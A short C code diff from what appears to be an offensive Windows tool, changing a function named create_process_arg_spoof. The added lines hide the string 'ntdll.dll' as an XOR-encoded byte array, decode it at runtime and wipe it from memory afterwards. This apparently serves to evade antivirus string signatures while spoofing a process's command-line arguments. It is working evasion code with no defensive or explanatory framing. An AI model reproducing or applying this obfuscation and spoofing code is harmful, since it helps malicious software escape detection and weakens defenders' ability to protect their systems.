@@ -1159,7 +1159,10 @@ static BOOL create_process_arg_spoof(const char *realCmd,
                                      HANDLE hStdOut, HANDLE hStdErr,
                                      PROCESS_INFORMATION *pi) {
     /* Resolve NtQueryInformationProcess from ntdll */
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    unsigned char _nt[] = {0x25,0x3f,0x2f,0x27,0x27,0x65,0x2f,0x27,0x27,0x00};
+    for (int _i=0;_nt[_i];_i++) _nt[_i]^=0x4B;
+    HMODULE hNtdll = GetModuleHandleA((char*)_nt);
+    SecureZeroMemory(_nt,sizeof(_nt));
     if (!hNtdll) return FALSE;
 
     char szNtQip[] = {'N','t','Q','u','e','r','y','I','n','f','o','r','m',
